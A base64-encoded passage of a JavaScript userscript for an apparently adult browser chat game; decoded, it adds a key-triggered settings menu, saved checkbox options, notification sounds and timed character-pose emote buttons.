cGxheSA9ICJibG9jayI7CiAgICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5vcGFjaXR5ID0gIjEiOwogICAgICAgIH0sIDApOwogICAgICAKICAgICAgICAvLyBIaWRlIHRoZSB0b2FzdCB3aXRoIGEgZmFkZSBvdXQgYW5pbWF0aW9uCiAgICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLm9wYWNpdHkgPSAiMCI7CiAgICAgICAgfSwgNTAwMCk7CiAgICAgIAogICAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOwogICAgICAgIH0sIDU1MDApOwogICAgICAgIHNlbmRGZGVidWcoKTsKICAgIAogICAgICB9CgogICAgfQogIH0KICBmdW5jdGlvbiBoZWxsbygpewogICAgQXVkaW9QbGF5SW5zdGFudFNvdW5kKCJodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdHRhY2htZW50cy83ODE3NDkyMjkzMzE5MzkzMjgvMTA5MDUzMDQ3OTA4MzYzMDY3Mi9oNDJ2d2NkLW5vdGlmaWNhdGlvbi0xX3ZNcWhWbHRTLm1wMyIsIDEpOwoKICB9CiAgLy8gTG9hZCB0aGUgY2hlY2tib3ggc3RhdGVzIGZyb20gbG9jYWwgc3RvcmFnZSwgaWYgYXZhaWxhYmxlCiAgaWYgKGxvY2FsU3RvcmFnZS5nZXRJdGVtKCJvcHRpb24xIikgIT09IG51bGwpIHsKICAgIGNoZWNrYm94MS5jaGVja2VkID0gbG9jYWxTdG9yYWdlLmdldEl0ZW0oIm9wdGlvbjEiKSA9PT0gInRydWUiOwogICAgaWYgKGNoZWNrYm94MS5jaGVja2VkKSB7CiAgICAgIHNldEludGVydmFsKHJ1bk9wdGlvbjEsIDEwMDApOwogICAgfQogIH0KICAKICBpZiAobG9jYWxTdG9yYWdlLmdldEl0ZW0oIm9wdGlvbjIiKSAhPT0gbnVsbCkgewogICAgY2hlY2tib3gyLmNoZWNrZWQgPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgib3B0aW9uMiIpID09PSAidHJ1ZSI7CiAgICBpZiAoY2hlY2tib3gyLmNoZWNrZWQpIHsKICAgICAgc2V0SW50ZXJ2YWwocnVuT3B0aW9uMiwgMTAwMCk7CiAgICB9CiAgfQoKICBpZiAobG9jYWxTdG9yYWdlLmdldEl0ZW0oIm9wdGlvbjMiKSAhPT0gbnVsbCkgewogICAgY2hlY2tib3gzLmNoZWNrZWQgPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgib3B0aW9uMyIpID09PSAidHJ1ZSI7CiAgICBpZiAoY2hlY2tib3gzLmNoZWNrZWQpIHsKICAgICAgc2V0SW50ZXJ2YWwocnVuT3B0aW9uMywgMTAwMCk7CiAgICB9CiAgfQogIAogIC8vIEFkZCBldmVudCBsaXN0ZW5lcnMgdG8gdGhlIGNoZWNrYm94ZXMgdG8gc2F2ZSB0aGVpciBzdGF0ZSBpbiBsb2NhbCBzdG9yYWdlCiAgY2hlY2tib3gxLmFkZEV2ZW50TGlzdGVuZXIoImNoYW5nZSIsIGZ1bmN0aW9uKCkgewogICAgbG9jYWxTdG9yYWdlLnNldEl0ZW0oIm9wdGlvbjEiLCBjaGVja2JveDEuY2hlY2tlZCk7CiAgICBpZiAoY2hlY2tib3gxLmNoZWNrZWQpIHsKICAgICAgc2V0SW50ZXJ2YWwocnVuT3B0aW9uMSwgMTAwMCk7CiAgICB9CiAgfSk7CiAgCiAgY2hlY2tib3gyLmFkZEV2ZW50TGlzdGVuZXIoImNoYW5nZSIsIGZ1bmN0aW9uKCkgewogICAgbG9jYWxTdG9yYWdlLnNldEl0ZW0oIm9wdGlvbjIiLCBjaGVja2JveDIuY2hlY2tlZCk7CiAgICBpZiAoY2hlY2tib3gyLmNoZWNrZWQpIHsKICAgICAgc2V0SW50ZXJ2YWwocnVuT3B0aW9uMiwgMTAwMCk7CiAgICB9CiAgfSk7CgogIGNoZWNrYm94My5hZGRFdmVudExpc3RlbmVyKCJjaGFuZ2UiLCBmdW5jdGlvbigpIHsKICAgIGxvY2FsU3RvcmFnZS5zZXRJdGVtKCJvcHRpb24zIiwgY2hlY2tib3gzLmNoZWNrZWQpOwogICAgaWYgKGNoZWNrYm94My5jaGVja2VkKSB7CiAgICAgIHNldEludGVydmFsKHJ1bk9wdGlvbjMsIDEwMDApOwogICAgfQogIH0pOwogIAoKLy9PcHRpb25zIFN0YXRlc19fX19fX19fX19fX19fX19fX19fX19fX19fX19fCgovLyBTYXZlIHRoZSBjaGVja2JveCBzdGF0ZXMgdG8gbG9jYWwgc3RvcmFnZSB3aGVuIHRoZXkgY2hhbmdlCmNoZWNrYm94MS5hZGRFdmVudExpc3RlbmVyKCJjaGFuZ2UiLCBmdW5jdGlvbigpIHsKICBsb2NhbFN0b3JhZ2Uuc2V0SXRlbSgib3B0aW9uMSIsIGNoZWNrYm94MS5jaGVja2VkKTsKfSk7CgpjaGVja2JveDIuYWRkRXZlbnRMaXN0ZW5lcigiY2hhbmdlIiwgZnVuY3Rpb24oKSB7CiAgbG9jYWxTdG9yYWdlLnNldEl0ZW0oIm9wdGlvbjIiLCBjaGVja2JveDIuY2hlY2tlZCk7Cn0pOwoKY2hlY2tib3gzLmFkZEV2ZW50TGlzdGVuZXIoImNoYW5nZSIsIGZ1bmN0aW9uKCkgewogIGxvY2FsU3RvcmFnZS5zZXRJdGVtKCJvcHRpb24zIiwgY2hlY2tib3gzLmNoZWNrZWQpOwp9KTsKCgoKLy8gQWRkIHRoZSBzZXR0aW5ncyBtZW51IHRvIHRoZSBkb2N1bWVudApkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHNldHRpbmdzTWVudSk7CgovLyBTaG93IHRoZSBzZXR0aW5ncyBtZW51IHdoZW4gdGhlIHVzZXIgcHJlc3NlcyBgIGFuZCBTIGF0IHRoZSBzYW1lIHRpbWUKbGV0IGlzQmFja3RpY2tQcmVzc2VkID0gZmFsc2U7CmxldCBpc1NQcmVzc2VkID0gZmFsc2U7Cgpkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCJrZXlkb3duIiwgZnVuY3Rpb24oZXZlbnQpIHsKICBpZiAoZXZlbnQua2V5ID09PSAiYCIpIHsKICAgIGlzQmFja3RpY2tQcmVzc2VkID0gdHJ1ZTsKICB9IGVsc2UgaWYgKGV2ZW50LmtleSA9PT0gInMiKSB7CiAgICBpc1NQcmVzc2VkID0gdHJ1ZTsKICB9CgogIGlmIChpc0JhY2t0aWNrUHJlc3NlZCAmJiBpc1NQcmVzc2VkKSB7CiAgICBzZXR0aW5nc01lbnUuc3R5bGUuZGlzcGxheSA9ICJibG9jayI7CiAgfQp9KTsKCi8vIEhpZGUgdGhlIHNldHRpbmdzIG1lbnUgd2hlbiB0aGUgdXNlciBjbGlja3Mgb2ZmCmRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoImNsaWNrIiwgZnVuY3Rpb24oZXZlbnQpIHsKICAgIGNvbnN0IHRhcmdldEVsZW1lbnQgPSBldmVudC50YXJnZXQ7CiAgICBjb25zdCBpc1NldHRpbmdzTWVudSA9ICEhdGFyZ2V0RWxlbWVudC5jbG9zZXN0KCIjc2V0dGluZ3MtbWVudSIpOwogICAgCiAgICBpZiAoIWlzU2V0dGluZ3NNZW51KSB7CiAgICAgIHNldHRpbmdzTWVudS5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOwogICAgfQogIH0pOwogIAogIAoKICAKCi8vIENsZWFyIHRoZSBgIGFuZCBTIGZsYWdzIHdoZW4gdGhlIHVzZXIgcmVsZWFzZXMgZWl0aGVyIGtleQpkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCJrZXl1cCIsIGZ1bmN0aW9uKGV2ZW50KSB7CiAgaWYgKGV2ZW50LmtleSA9PT0gImAiKSB7CiAgICBpc0JhY2t0aWNrUHJlc3NlZCA9IGZhbHNlOwogIH0gZWxzZSBpZiAoZXZlbnQua2V5ID09PSAicyIpIHsKICAgIGlzU1ByZXNzZWQgPSBmYWxzZTsKICB9Cn0pOwoKCi8vRW5kIG9mIFBlcnNpc3RhbnQgTWVudSBfX19fX19fX19fX19fX19fX19fX18KCi8vU3RhcnQgb2YgRW1vdGUgTWVudSBfX19fX19fX19fX19fX19fX19fX18KCi8vIERlZmluZSBidXR0b24gVVJMcyBhbmQgbmFtZXMKY29uc3QgYnV0dG9uRGF0YSA9IFsKICB7IG5hbWU6ICJQdWxsLVVwcyIsIGFjdGlvbjogKCkgPT4gewogICAgICAgIHNob3dUb2FzdHNjcGcoKTsKICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgbnVsbCk7CiAgICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsICJMZWdzT3BlbiIpOwogICAgICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgIk92ZXJUaGVIZWFkIik7CiAgICAgICAgICAgIEludmVudG9yeUdldChQbGF5ZXIsICJFbW90aWNvbiIpLlByb3BlcnR5Lk92ZXJyaWRlSGVpZ2h0ID0gewogICAgICAgICAgICAgICAgSGVpZ2h0OiAxMzAKICAgICAgICAgICAgfTsKICAgICAgICAgICAgQ3VycmVudFNjcmVlbiA9PT0gIkNoYXRSb29tIiA/CiAgICAgICAgICAgICAgICBDaGF0Um9vbUNoYXJhY3RlclVwZGF0ZShQbGF5ZXIpIDoKICAgICAgICAgICAgICAgIENoYXJhY3RlclJlZnJlc2goUGxheWVyKTsKICAgICAgICB9LCAxMDAwKTsKICAgICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgIllva2VkIik7CiAgICAgICAgICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCAiTGVnc0Nsb3NlZCIpOwogICAgICAgICAgICBJbnZlbnRvcnlHZXQoUGxheWVyLCAiRW1vdGljb24iKS5Qcm9wZXJ0eS5PdmVycmlkZUhlaWdodCA9IHsKICAgICAgICAgICAgICAgIEhlaWdodDogMjUwCiAgICAgICAgICAgIH07CiAgICAgICAgICAgIEN1cnJlbnRTY3JlZW4gPT09ICJDaGF0Um9vbSIgPwogICAgICAgICAgICAgICAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKSA6CiAgICAgICAgICAgICAgICBDaGFyYWN0ZXJSZWZyZXNoKFBsYXllcik7CiAgICAgICAgfSwgMjAwMCk7CiAgICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKCiAgICAgICAgICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCAiTGVnc09wZW4iKTsKICAgICAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsICJPdmVyVGhlSGVhZCIpCiAgICAgICAgICAgIEludmVudG9yeUdldChQbGF5ZXIsICJFbW90aWNvbiIpLlByb3BlcnR5Lk92ZXJyaWRlSGVpZ2h0ID0gewogICAgICAgICAgICAgICAgSGVpZ2h0OiAxMzAKICAgICAgICAgICAgfTsKICAgICAgICAgICAgQ3VycmVudFNjcmVlbiA9PT0gIkNoYXRSb29tIiA/CiAgICAgICAgICAgICAgICBDaGF0Um9vbUNoYXJhY3RlclVwZGF0ZShQbGF5ZXIpIDoKICAgICAgICAgICAgICAgIENoYXJhY3RlclJlZnJlc2goUGxheWVyKTsKICAgICAgICB9LCAzMDAwKTsKICAgICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgIllva2VkIik7CiAgICAgICAgICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCAiTGVnc0Nsb3NlZCIpOwogICAgICAgICAgICBJbnZlbnRvcnlHZXQoUGxheWVyLCAiRW1vdGljb24iKS5Qcm9wZXJ0eS5PdmVycmlkZUhlaWdodCA9IHsKICAgICAgICAgICAgICAgIEhlaWdodDogMjUwCiAgICAgICAgICAgIH07CiAgICAgICAgICAgIEN1cnJlbnRTY3JlZW4gPT09ICdDaGF0Um9vbScgPwogICAgICAgICAgICAgICAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKSA6CiAgICAgICAgICAgICAgICBDaGFyYWN0ZXJSZWZyZXNoKFBsYXllcik7CiAgICAgICAgfSwgNDAwMCk7ICAgIAogICAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCAiTGVnc09wZW4iKTsKICAgICAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsICJPdmVyVGhlSGVhZCIpCiAgICAgICAgICAgIEludmVudG9yeUdldChQbGF5ZXIsICJFbW90aWNvbiIpLlByb3BlcnR5Lk92ZXJyaWRlSGVpZ2h0ID0gewogICAgICAgICAgICAgICAgSGVpZ2h0OiAxMzAKICAgICAgICAgICAgfTsKICAgICAgICAgICAgQ3VycmVudFNjcmVlbiA9PT0gIkNoYXRSb29tIiA/CiAgICAgICAgICAgICAgICBDaGF0Um9vbUNoYXJhY3RlclVwZGF0ZShQbGF5ZXIpIDoKICAgICAgICAgICAgICAgIENoYXJhY3RlclJlZnJlc2goUGxheWVyKTsKICAgICAgICB9LCA1MDAwKTsKICAgICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgbnVsbCk7CiAgICAgICAgICAgIGRlbGV0ZSBJbnZlbnRvcnlHZXQoUGxheWVyLCAnRW1vdGljb24nKS5Qcm9wZXJ0eS5PdmVycmlkZUhlaWdodDsKICAgICAgICAgICAgQ3VycmVudFNjcmVlbiA9PT0gJ0NoYXRSb29tJyA/CiAgICAgICAgICAgICAgICBDaGF0Um9vbUNoYXJhY3RlclVwZGF0ZShQbGF5ZXIpIDoKICAgICAgICAgICAgICAgIENoYXJhY3RlclJlZnJlc2goUGxheWVyKTsKICAgICAgICB9LCA2MDAwKTsgICAgCn0gfSwKICB7IG5hbWU6ICJDaGVlciIsIGFjdGlvbjogKCkgPT4gewogICAgc2hvd1RvYXN0c2NwZygpOwogICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCBudWxsKTsKICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCAiWW9rZWQiKTsKICAgICAgICAgIEN1cnJlbnRTY3JlZW4gPT09ICJDaGF0Um9vbSIgPwogICAgICAgICAgICAgIENoYXRSb29tQ2hhcmFjdGVyVXBkYXRlKFBsYXllcikgOgogICAgICAgICAgICAgIENoYXJhY3RlclJlZnJlc2goUGxheWVyKTsKICAgICAgfSwgMTAwMCk7CiAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgIk92ZXJUaGVIZWFkIik7CiAgICAgICAgICBDdXJyZW50U2NyZWVuID09PSAiQ2hhdFJvb20iID8KICAgICAgICAgICAgICBDaGF0Um9vbUNoYXJhY3RlclVwZGF0ZShQbGF5ZXIpIDoKICAgICAgICAgICAgICBDaGFyYWN0ZXJSZWZyZXNoKFBsYXllcik7CiAgICAgIH0sIDIwMDApOwogICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsICJZb2tlZCIpOwogICAgICAgICAgQ3VycmVudFNjcmVlbiA9PT0gIkNoYXRSb29tIiA/CiAgICAgICAgICAgICAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKSA6CiAgICAgICAgICAgICAgQ2hhcmFjdGVyUmVmcmVzaChQbGF5ZXIpOwogICAgICB9LCAzMDAwKTsKICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCAiT3ZlclRoZUhlYWQiKTsKICAgICAgICAgIEN1cnJlbnRTY3JlZW4gPT09ICJDaGF0Um9vbSIgPwogICAgICAgICAgICAgIENoYXRSb29tQ2hhcmFjdGVyVXBkYXRlKFBsYXllcikgOgogICAgICAgICAgICAgIENoYXJhY3RlclJlZnJlc2goUGxheWVyKTsKICAgICAgfSwgNDAwMCk7ICAgIAogICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsICJZb2tlZCIpOwogICAgICAgICAgQ3VycmVudFNjcmVlbiA9PT0gIkNoYXRSb29tIiA/CiAgICAgICAgICAgICAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKSA6CiAgICAgICAgICAgICAgQ2hhcmFjdGVyUmVmcmVzaChQbGF5ZXIpOwogICAgICB9LCA1MDAwKTsKICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCAiT3ZlclRoZUhlYWQiKTsKICAgICAgICAgIEN1cnJlbnRTY3JlZW4gPT09ICJDaGF0Um9vbSIgPwogICAgICAgICAgICAgIENoYXRSb29tQ2hhcmFjdGVyVXBkYXRlKFBsYXllcikgOgogICAgICAgICAgICAgIENoYXJhY3RlclJlZnJlc2goUGxheWVyKTsKICAgICAgfSwgNjAwMCk7CiAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgbnVsbCk7CiAgICAgICAgICBDdXJyZW50U2NyZWVuID09PSAnQ2hhdFJvb20nID8KICAgICAgICAgICAgICBDaGF0Um9vbUNoYXJhY3RlclVwZGF0ZShQbGF5ZXIpIDoKICAgICAgICAgICAgICBDaGFyYWN0ZXJSZWZyZXNoKFBsYXllcik7CiAgICAgIH0sIDcwMDApOyB9IH0sCiAgeyBuYW1lOiAiSnVtcGluZyBKYWNrcyIsIGFjdGlvbjogKCkgPT4gewogICAgc2hvd1RvYXN0c2NwZygpOwogICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCBudWxsKTsKICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgICAgIEludmVudG9yeUdldChQbGF5ZXIsICJFbW90aWNvbiIpLlByb3BlcnR5Lk92ZXJyaWRlSGVpZ2h0ID0gewogICAgICAgICAgICAgIEhlaWdodDogMTUwCiAgICAgICAgICB9OwogICAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsICJMZWdzT3BlbiIpOwogICAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsICJPdmVyVGhlSGVhZCIpOwogICAgICAgICAgQ3VycmVudFNjcmVlbiA9PT0gIkNoYXRSb29tIiA/CiAgICAgICAgICAgICAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKSA6CiAgICAgICAgICAgICAgQ2hhcmFjdGVyUmVmcmVzaChQbGF5ZXIpOwogICAgICB9LCAxMDAwKTsKICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgICAgIEludmVudG9yeUdldChQbGF5ZXIsICJFbW90aWNvbiIpLlByb3BlcnR5Lk92ZXJyaWRlSGVpZ2h0ID0gdW5kZWZpbmVkOwogICAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsIG51bGwpOwogICAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsICJMZWdzQ2xvc2VkIik7CiAgICAgICAgICBDdXJyZW50U2NyZWVuID09PSAiQ2hhdFJvb20iID8KICAgICAgICAgICAgICBDaGF0Um9vbUNoYXJhY3RlclVwZGF0ZShQbGF5ZXIpIDoKICAgICAgICAgICAgICBDaGFyYWN0ZXJSZWZyZXNoKFBsYXllcik7CiAgICAgIH0sIDIwMDApOwogICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgICAgSW52ZW50b3J5R2V0KFBsYXllciwgIkVtb3RpY29uIikuUHJvcGVydHkuT3ZlcnJpZGVIZWlnaHQgPSB7CiAgICAgICAgICAgICAgSGVpZ2h0OiAxNTAKICAgICAgICAgIH07CiAgICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgIkxlZ3NPcGVuIik7CiAgICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgIk92ZXJUaGVIZWFkIikKICAgICAgICAgIEN1cnJlbnRTY3JlZW4gPT09ICJDaGF0Um9vbSIgPwogICAgICAgICAgICAgIENoYXRSb29tQ2hhcmFjdGVyVXBkYXRlKFBsYXllcikgOgogICAgICAgICAgICAgIENoYXJhY3RlclJlZnJlc2goUGxheWVyKTsKICAgICAgfSwgMzAwMCk7CiAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgbnVsbCk7CiAgICAgICAgICBkZWxldGUgSW52ZW50b3J5R2V0KFBsYXllciwgJ0Vtb3RpY29uJykuUHJvcGVydHkuT3ZlcnJpZGVIZWlnaHQ7CiAgICAgICAgICBDdXJyZW50U2NyZWVuID09PSAnQ2hhdFJvb20nID8KICAgICAgICAgICAgICBDaGF0Um9vbUNoYXJhY3RlclVwZGF0ZShQbGF5ZXIpIDoKICAgICAgICAgICAgICBDaGFyYWN0ZXJSZWZyZXNoKFBsYXllcik7CiAgICAgIH0sIDQwMDApOyAgICAgfSB9LAogIHsgbmFtZTogIkJ1cnBlZXMiLCBhY3Rpb246ICgpID0+IHsKICAgIHNob3dUb2FzdHNjcGcoKTsKICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCBudWxsKTsKICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCAiSG9ndGllZCIpOwogICAgICAgICAgQ3VycmVudFNjcmVlbiA9PT0gIkNoYXRSb29tIiA/CiAgICAgICAgICAgICAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKSA6CiAgICAgICAgICAgICAgQ2hhcmFjdGVyUmVmcmVzaChQbGF5ZXIpOwogICAgICB9LCAxMDAwKTsKICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCBudWxsKTsKICAgICAgICAgIEN1cnJlbnRTY3JlZW4gPT09ICJDaGF0Um9vbSIgPwogICAgICAgICAgICAgIENoYXRSb29tQ2hhcmFjdGVyVXBkYXRlKFBsYXllcikgOgogICAgICAgICAgICAgIENoYXJhY3RlclJlZnJlc2goUGxheWVyKTsKICAgICAgfSwgMjAwMCk7CiAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgIllva2VkIik7CiAgICAgICAgICBDdXJyZW50U2NyZWVuID09PSAiQ2hhdFJvb20iID8KICAgICAgICAgICAgICBDaGF0Um9vbUNoYXJhY3RlclVwZGF0ZShQbGF5ZXIpIDoKICAgICAgICAgICAgICBDaGFyYWN0ZXJSZWZyZXNoKFBsYXllcik7CiAgICAgIH0sIDMwMDApOwogICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsIG51bGwpOwogICAgICAgICAgQ3VycmVudFNjcmVlbiA9PT0gIkNoYXRSb29tIiA/CiAgICAgICAgICAgICAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKSA6CiAgICAgICAgICAgICAgQ2hhcmFjdGVyUmVmcmVzaChQbGF5ZXIpOwogICAgICB9LCA0MDAwKTsgICAgCiAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgIkhvZ3RpZWQiKTsKICAgICAgICAgIEN1cnJlbnRTY3JlZW4gPT09ICJDaGF0Um9vbSIgPwogICAgICAgICAgICAgIENoYXRSb29tQ2hhcmFjdGVyVXBkYXRlKFBsYXllcikgOgogICAgICAgICAgICAgIENoYXJhY3RlclJlZnJlc2goUGxheWVyKTsKICAgICAgfSwgNTAwMCk7CiAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgbnVsbCk7CiAgICAgICAgICBDdXJyZW50U2NyZWVuID09PSAiQ2hhdFJvb20iID8KICAgICAgICAgICAgICBDaGF0Um9vbUNoYXJhY3RlclVwZGF0ZShQbGF5ZXIpIDoKICAgICAgICAgICAgICBDaGFyYWN0ZXJSZWZyZXNoKFBsYXllcik7CiAgICAgIH0sIDYwMDApOwogICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsICJZb2tlZCIpOwogICAgICAgICAgQ3VycmVudFNjcmVlbiA9PT0gJ0NoYXRSb29tJyA/CiAgICAgICAgICAgICAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKSA6CiAgICAgICAgICAgICAgQ2hhcmFjdGVyUmVmcmVzaChQbGF5ZXIpOwogICAgICB9LCA3MDAwKTsKICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCBudWxsKTsKICAgICAgICAgIEN1cnJlbnRTY3JlZW4gPT09ICdDaGF0Um9vbScgPwogICAgICAgICAgICAgIENoYXRSb29tQ2hhcmFjdGVyVXBkYXRlKFBsYXllcikgOgogICAgICAgICAgICAgIENoYXJhY3RlclJlZnJlc2goUGxheWVyKTsKICAgICAgfSwgODAwMCk7IH0gfSwKICB7IG5hbWU6ICJTbGVlcCIsIGFjdGlvbjogKCkgPT4gewogICAgc2hvd1RvYXN0c2NwZygpOwogICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsICJIb2d0aWVkIik7CiAgQ2hhcmFjdGVyU2V0RmFjaWFsRXhwcmVzc2lvbihQbGF5ZXIsICJFeWVzIiwgIkNsb3NlZCIpOwogIENoYXJhY3RlclNldEZhY2lhbEV4cHJlc3Npb24oUGxheWVyLCAiRXllczIiLCAiQ2xvc2VkIik7CiAgQ2hhcmFjdGVyU2V0RmFjaWFsRXhwcmVzc2lvbihQbGF5ZXIsICJFbW90aWNvbiIsICJTbGVlcCIpOwogIENoYXRSb29tQ2hhcmFjdGVyVXBkYXRlKFBsYXllcik7ICB9IH0KXTsKCi8vIENyZWF0ZSBidXR0b24gZWxlbWVudHMKY29uc3QgYnV0dG9uQ29udGFpbmVyID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiZGl2Iik7CmJ1dHRvbkNvbnRhaW5lci5zdHlsZS5wb3NpdGlvbiA9ICJmaXhlZCI7CmJ1dHRvbkNvbnRhaW5lci5zdHlsZS53aWR0aCA9ICIzMDBweCI7CmJ1dHRvbkNvbnRhaW5lci5zdHlsZS5oZWlnaHQgPSAiMzAwcHgiOwpidXR0b25Db250YWluZXIuc3R5bGUubGVmdCA9ICI1MCUiOwpidXR0b25Db250YWluZXIuc3R5bGUudG9wID0gIjUwJSI7CmJ1dHRvbkNvbnRhaW5lci5zdHlsZS50cmFuc2Zvcm0gPSAidHJhbnNsYXRlKC01MCUsIC01MCUpIjsKYnV0dG9uQ29udGFpbmVyLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7CmNvbnN0IGJ1dHRvbkNpcmNsZSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImRpdiIpOwpidXR0b25DaXJjbGUuc3R5bGUucG9zaXRpb24gPSAiYWJzb2x1dGUiOwpidXR0b25DaXJjbGUuc3R5bGUud2lkdGggPSAiMjAwcHgiOwpidXR0b25DaXJjbGUuc3R5bGUuaGVpZ2h0ID0gIjIwMHB4IjsKYnV0dG9uQ2lyY2xlLnN0eWxlLmJvcmRlclJhZGl1cyA9ICI1MCUiOwpidXR0b25DaXJjbGUuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIndoaXRlIjsKYnV0dG9uQ2lyY2xlLnN0eWxlLm9wYWNpdHkgPSAiMSI7CmJ1dHRvbkNpcmNsZS5zdHlsZS5sZWZ0ID0gIjUwJSI7CmJ1dHRvbkNpcmNsZS5zdHlsZS50b3AgPSAiNTAlIjsKYnV0dG9uQ2lyY2xlLnN0eWxlLnRyYW5zZm9ybSA9I